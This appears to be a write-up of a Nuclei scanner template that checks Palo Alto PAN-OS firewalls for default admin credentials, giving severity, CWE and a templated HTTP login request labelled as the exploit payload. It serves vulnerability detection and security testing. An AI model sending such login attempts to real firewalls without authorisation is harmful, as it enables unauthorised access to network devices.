# Nuclei Template: Palo Alto Networks PAN-OS Default Login
**Template ID:** panos-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`panos-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Palo Alto Networks PAN-OS application default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /php/login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user={{username}}&passwd={{password}}&challengePwd=&ok=Login
```

## References
- https://docs.paloaltonetworks.com/pan-os/8-1/pan-os-admin/getting-started/integrate-the-firewall-into-your-management-network/perform-initial-configuration.html#:~:text=By%20default%2C%20the%20firewall%20has,with%20other%20firewall%20configuration%20tasks.
